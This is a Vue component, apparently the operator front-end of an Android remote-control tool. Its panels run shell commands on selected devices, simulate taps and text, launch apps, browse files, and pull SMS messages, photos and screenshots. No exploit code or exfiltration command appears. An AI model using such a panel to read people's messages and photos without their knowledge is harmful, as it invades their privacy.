<template>
  <div class="layout">
    <!-- Sidebar -->
    <aside class="sidebar">
      <div class="brand">📱 Remote Console</div>
      <div class="section-title">在线设备</div>
      <div v-if="store.devices.length === 0" class="no-device">暂无设备在线</div>
      <div
        v-for="dev in store.devices"
        :key="dev.deviceId"
        class="device-item"
        :class="{ active: store.selectedDevice === dev.deviceId }"
        @click="store.selectDevice(dev.deviceId)"
      >
        <span class="dot"></span>
        <span>{{ dev.name }}</span>
        <span class="dev-id">{{ dev.deviceId.slice(0,8) }}</span>
      </div>
      <div class="spacer"/>
      <div class="conn-badge" :class="store.connected ? 'online' : 'offline'">
        {{ store.connected ? '● 已连接' : '○ 断开中' }}
      </div>
      <button class="logout-btn" @click="logout">退出登录</button>
    </aside>

    <!-- Main panel -->
    <main class="main">
      <div v-if="!store.selectedDevice" class="no-select">
        <p>← 请从左侧选择一台设备</p>
      </div>
      <div v-else class="panels">
        <!-- Shell 终端 -->
        <section class="panel">
          <div class="panel-title">Shell 终端</div>
          <div class="terminal" ref="termEl">{{ store.cmdOutput || '(等待输出...)' }}</div>
          <div class="input-row">
            <input v-model="cmd" placeholder="输入 Shell 命令" @keyup.enter="runCmd"/>
            <button @click="runCmd">执行</button>
            <button class="btn-clear" @click="store.cmdOutput = ''">清空</button>
          </div>
        </section>

        <!-- App 自动化 -->
        <section class="panel">
          <div class="panel-title">App 自动操作</div>
          <div class="auto-grid">
            <div class="auto-group">
              <label>模拟点击 (x, y)</label>
              <div class="input-row">
                <input v-model.number="tapX" type="number" placeholder="X" style="width:80px"/>
                <input v-model.number="tapY" type="number" placeholder="Y" style="width:80px"/>
                <button @click="store.tapScreen(tapX, tapY)">点击</button>
              </div>
            </div>
            <div class="auto-group">
              <label>输入文字</label>
              <div class="input-row">
                <input v-model="inputText" placeholder="要输入的文字"/>
                <button @click="store.sendInput(inputText)">发送</button>
              </div>
            </div>
            <div class="auto-group">
              <label>启动应用</label>
              <div class="input-row">
                <input v-model="launchPkg" placeholder="包名 com.xxx.xxx"/>
                <button @click="store.launchApp(launchPkg)">启动</button>
              </div>
            </div>
          </div>
        </section>

        <!-- 文件管理 -->
        <section class="panel">
          <div class="panel-title">文件管理</div>
          <div class="input-row">
            <input v-model="filePath" placeholder="/sdcard"/>
            <button @click="store.listFiles(filePath)">列出目录</button>
          </div>
          <div class="file-list">
            <div v-if="store.fileList.length === 0" class="empty">尚未获取目录</div>
            <div v-for="f in store.fileList" :key="f.name" class="file-item">
              <span>{{ f.isDir ? '📁' : '📄' }}</span>
              <span>{{ f.name }}</span>
              <span class="file-size">{{ f.size }}</span>
            </div>
          </div>
        </section>

        <!-- 短信读取 -->
        <section class="panel">
          <div class="panel-title">📱 短信读取</div>
          <div class="input-row">
            <button @click="store.fetchSms(50)">获取短信</button>
          </div>
          <div class="sms-list">
            <div v-if="store.smsList.length === 0" class="empty">暂无短信数据</div>
            <div v-for="(sms, i) in store.smsList" :key="i" class="sms-item">
              <div class="sms-header">
                <span class="sms-addr">📞 {{ sms.address }}</span>
                <span class="sms-date">{{ formatDate(sms.date) }}</span>
              </div>
              <div class="sms-body">{{ sms.body }}</div>
            </div>
          </div>
        </section>

        <!-- 相册读取 -->
        <section class="panel">
          <div class="panel-title">🖼️ 相册读取</div>
          <div class="input-row">
            <button @click="store.fetchPhotos(50)">获取相册</button>
          </div>
          <div class="photo-grid">
            <div v-if="store.photoList.length === 0" class="empty">暂无照片数据</div>
            <div v-for="(p, i) in store.photoList" :key="i" class="photo-item" @click="store.fetchPhoto(p.path)">
              <div class="photo-name">🖼️ {{ p.name }}</div>
              <div class="photo-meta">{{ (Number(p.size)/1024).toFixed(1) }}KB · {{ formatDate(p.date) }}</div>
            </div>
          </div>
          <!-- 图片预览 -->
          <div v-if="store.photoPreview" class="photo-preview">
            <div class="preview-header">
              <span>图片预览</span>
              <button class="btn-clear" @click="store.photoPreview = ''">关闭</button>
            </div>
            <img :src="'data:image/jpeg;base64,' + store.photoPreview" class="preview-img"/>
          </div>
        </section>

        <!-- 屏幕截图 -->
        <section class="panel">
          <div class="panel-title">📷 屏幕截图</div>
          <div class="input-row">
            <button @click="store.fetchScreenshot()">截取屏幕</button>
          </div>
          <div v-if="store.screenshot" class="screenshot-box">
            <img v-if="!store.screenshot.startsWith('ERROR')" :src="'data:image/png;base64,' + store.screenshot" class="screenshot-img"/>
            <div v-else class="empty">{{ store.screenshot }}</div>
          </div>
          <div v-else class="empty">点击上方按钮截取屏幕</div>
        </section>
      </div>
    </main>
  </div>
</template>

<script setup>
import { ref, onMounted, watch } from 'vue'
import { useRouter } from 'vue-router'
import { useRemoteStore } from '../store/remote'

const router = useRouter()
const store = useRemoteStore()
const cmd = ref('')
const tapX = ref(540)
const tapY = ref(960)
const inputText = ref('')
const launchPkg = ref('')
const filePath = ref('/sdcard')
const termEl = ref(null)

function formatDate(ts) {
  if (!ts) return ''
  const d = new Date(Number(ts) < 1e12 ? Number(ts) * 1000 : Number(ts))
  return d.toLocaleString('zh-CN', { month:'2-digit', day:'2-digit', hour:'2-digit', minute:'2-digit' })
}

onMounted(() => {
  const token = localStorage.getItem('token')
  if (!token) { router.push('/login'); return }
  store.connect(token)
})

watch(() => store.cmdOutput, () => {
  if (termEl.value) termEl.value.scrollTop = termEl.value.scrollHeight
})

function runCmd() {
  if (!cmd.value.trim()) return
  store.cmdOutput += `\n$ ${cmd.value}\n`
  store.sendShell(cmd.value)
  cmd.value = ''
}

function logout() {
  localStorage.removeItem('token')
  router.push('/login')
}
</script>

<style scoped>
.layout { display:flex; height:100vh; overflow:hidden; }
.sidebar { width:220px; background:#12151f; border-right:1px solid #1e2235; display:flex; flex-direction:column; padding:16px 12px; gap:8px; flex-shrink:0; }
.brand { font-size:16px; font-weight:600; color:#a5b4fc; padding:0 4px 12px; border-bottom:1px solid #1e2235; }
.section-title { font-size:11px; color:#6b7280; text-transform:uppercase; letter-spacing:.08em; padding:4px; }
.no-device { font-size:12px; color:#4b5563; padding:4px; }
.device-item { display:flex; align-items:center; gap:8px; padding:8px 10px; border-radius:8px; cursor:pointer; font-size:13px; transition:background .15s; }
.device-item:hover { background:#1e2235; }
.device-item.active { background:#1e2040; color:#a5b4fc; }
.dot { width:7px; height:7px; border-radius:50%; background:#22c55e; flex-shrink:0; }
.dev-id { font-size:10px; color:#6b7280; margin-left:auto; }
.spacer { flex:1; }
.conn-badge { font-size:12px; padding:6px 10px; border-radius:6px; text-align:center; }
.conn-badge.online { color:#22c55e; }
.conn-badge.offline { color:#f87171; }
.logout-btn { background:transparent; border:1px solid #2d3148; color:#9ca3af; border-radius:8px; padding:8px; font-size:13px; cursor:pointer; }
.logout-btn:hover { background:#1e2235; }

.main { flex:1; overflow-y:auto; padding:24px; background:#0f1117; }
.no-select { display:flex; align-items:center; justify-content:center; height:100%; color:#4b5563; font-size:18px; }
.panels { display:flex; flex-direction:column; gap:20px; }
.panel { background:#1a1d27; border:1px solid #2d3148; border-radius:12px; padding:20px; }
.panel-title { font-size:13px; font-weight:600; color:#a5b4fc; margin-bottom:14px; text-transform:uppercase; letter-spacing:.06em; }
.terminal { background:#0a0c12; border:1px solid #1e2235; border-radius:8px; padding:12px; font-family:'JetBrains Mono','Courier New',monospace; font-size:12px; color:#86efac; min-height:140px; max-height:260px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; margin-bottom:10px; }
.input-row { display:flex; gap:8px; }
.input-row input { flex:1; background:#0f1117; border:1px solid #2d3148; border-radius:8px; padding:8px 12px; color:#e2e8f0; font-size:13px; outline:none; }
.input-row input:focus { border-color:#6366f1; }
.input-row button { background:#6366f1; color:#fff; border:none; border-radius:8px; padding:8px 16px; cursor:pointer; font-size:13px; white-space:nowrap; }
.input-row button:hover { background:#4f46e5; }
.btn-clear { background:#374151 !important; }
.btn-clear:hover { background:#4b5563 !important; }
.auto-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:16px; }
.auto-group { display:flex; flex-direction:column; gap:8px; }
.auto-group label { font-size:12px; color:#9ca3af; }
.file-list { margin-top:12px; max-height:200px; overflow-y:auto; }
.empty { color:#4b5563; font-size:13px; }
.file-item { display:flex; align-items:center; gap:8px; padding:6px 0; border-bottom:1px solid #1e2235; font-size:13px; }
.file-size { margin-left:auto; color:#6b7280; font-size:11px; }
.sms-list { margin-top:12px; max-height:300px; overflow-y:auto; }
.sms-item { padding:10px 0; border-bottom:1px solid #1e2235; }
.sms-header { display:flex; justify-content:space-between; margin-bottom:4px; }
.sms-addr { font-size:13px; font-weight:600; color:#a5b4fc; }
.sms-date { font-size:11px; color:#6b7280; }
.sms-body { font-size:13px; color:#e2e8f0; line-height:1.5; word-break:break-all; }
.photo-grid { margin-top:12px; display:grid; grid-template-columns:repeat(auto-fill, minmax(180px,1fr)); gap:8px; max-height:300px; overflow-y:auto; }
.photo-item { background:#0f1117; border:1px solid #2d3148; border-radius:8px; padding:10px; cursor:pointer; transition:border-color .15s; }
.photo-item:hover { border-color:#6366f1; }
.photo-name { font-size:12px; color:#e2e8f0; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
.photo-meta { font-size:11px; color:#6b7280; margin-top:4px; }
.photo-preview { margin-top:14px; }
.preview-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; font-size:13px; color:#a5b4fc; }
.preview-img { max-width:100%; max-height:400px; border-radius:8px; border:1px solid #2d3148; }
.screenshot-box { margin-top:12px; }
.screenshot-img { max-width:100%; max-height:500px; border-radius:8px; border:1px solid #2d3148; }
</style>
